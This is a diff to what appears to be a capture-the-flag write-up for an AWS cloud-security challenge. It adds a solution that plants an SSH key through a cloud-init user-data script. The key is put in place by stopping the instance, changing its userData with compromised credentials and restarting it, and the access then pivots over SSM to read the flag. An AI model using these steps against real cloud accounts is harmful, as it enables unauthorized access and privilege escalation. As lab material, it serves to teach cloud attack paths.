@@ -429,19 +429,39 @@ awsn lambda invoke --function-name attackfunction --profile double_tap_xsdf outp
 cat outputfile | jq
 ```
 
-With these credentials, access to the instance that has the `ec2_privileged` role is needed.
+With these credentials, access to the instance that has the `ec2_privileged` role is needed. The instance has an open port 22, but it needs an SSH key. User data does not run after starting a stopped instance, unless it is used as a `cloud-init` script, which can be defined as following &rarr;
 
-> ***Solution Caveat*** &rarr; This challenge does not grant `ec2-instance-connect:sendSSHKey` permission to `lambda_ec2` role, without which, I did not find a way with only `ec2:*` to execute arbitrary code on the instance. It can be added to the policy in the defining Terraform file
-{: .prompt-warning }
+```yml
+#cloud-config
+cloud_final_modules:
+  - [users-groups,always]
+users:
+  - name: ec2-user
+    ssh-authorized-keys:
+      - ssh-ed25519 keydatakeydatakeydatakeydatakeydatakeydata user@host
+```
 
-The following can be used to deploy a key using the session of `lambda_ec2` &rarr;
+The key used can be generated as &rarr;
 
 ```bash
 ssh-keygen -t ed25519 -b 2048 # save as ec2_key
-awsn ec2-instance-connect send-ssh-public-key --instance-id i-0fbxxxxx --instance-os-user ec2-user --region us-west-2 --ssh-public-key file://ec2key.pub --profile lambda_ec2
 ```
 
-Then SSH-ing into the instance associated with the `ec2_privileged` role allows us to start an SSM session with the other instance with `double_tap2` tag and associated role `double_tap_secret` to read the secret flag &rarr;
+The YAML content can be stored in a file `userdatanormal.txt` and then converted to base64 with &rarr;
+
+```bash
+base64 userdatanormal.txt > userdataencoded.txt
+```
+
+Then, the following can be used to deploy a key using the session of `lambda_ec2` &rarr;
+
+```bash
+awsn ec2 stop-instances --instance-id i-0hshshshshhshs --region us-west-2 --profile lambda_ec2
+awsn ec2 modify-instance-attribute --instance-id i-0hshshshshhshs --attribute userData --value file:userdataencoded.txt --region us-west-2 --profile lambda_ec2
+awsn ec2 start-instances --instance-id i-0hshshshshhshs --region us-west-2 --profile lambda_ec2
+```
+
+This instates the key into the instance and allows SSH-ing into the instance associated with the `ec2_privileged` role, which allows us to start an SSM session with the other instance with `double_tap2` tag and associated role `double_tap_secret` to read the secret flag &rarr;
 
 ```bash
 awsn ssm start-session --target i-06eeb27aff191127a --region us-west-2 --profile ec2_privileged
